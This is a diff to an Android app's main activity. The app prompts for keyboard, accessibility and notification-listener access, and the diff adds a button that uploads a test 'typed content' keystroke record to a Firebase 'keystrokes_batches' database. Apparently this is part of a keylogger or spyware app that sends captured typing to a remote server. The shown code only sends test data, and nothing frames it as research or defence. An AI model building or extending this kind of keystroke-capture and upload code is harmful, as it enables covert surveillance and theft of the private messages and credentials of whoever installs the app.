@@ -9,7 +9,12 @@ import android.provider.Settings
 import android.view.inputmethod.InputMethodManager
 import android.widget.Button
 import android.widget.TextView
+import android.widget.Toast
 import com.google.firebase.FirebaseApp
+import com.google.firebase.database.FirebaseDatabase
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class MainActivity : Activity() {
 
@@ -39,6 +44,7 @@ class MainActivity : Activity() {
             val btnKeyboard = findViewById<Button>(R.id.btnEnableKeyboard)
             val btnAccessibility = findViewById<Button>(R.id.btnEnableAccessibility)
             val btnNotification = findViewById<Button>(R.id.btnEnableNotification)
+            val btnTestSync = findViewById<Button>(R.id.btnTestSync)
 
             btnKeyboard?.setOnClickListener {
                 try {
@@ -61,6 +67,29 @@ class MainActivity : Activity() {
                     startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                 } catch (e: Exception) {
                     e.printStackTrace()
+                }
+            }
+
+            btnTestSync?.setOnClickListener {
+                try {
+                    val database = FirebaseDatabase.getInstance()
+                    val ref = database.getReference("keystrokes_batches")
+                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())
+                    val testData = mapOf(
+                        "appName" to "test.app",
+                        "timestamp" to System.currentTimeMillis(),
+                        "typedContent" to "Manual test keystroke at $timestampKey"
+                    )
+
+                    ref.child("test_app").child(timestampKey).setValue(testData)
+                        .addOnSuccessListener {
+                            Toast.makeText(this, "Test sync successful! Check Firebase.", Toast.LENGTH_LONG).show()
+                        }
+                        .addOnFailureListener { e: Exception ->
+                            Toast.makeText(this, "Test sync failed: ${e.message}", Toast.LENGTH_LONG).show()
+                        }
+                } catch (e: Exception) {
+                    Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                 }
             }
         } catch (e: Exception) {
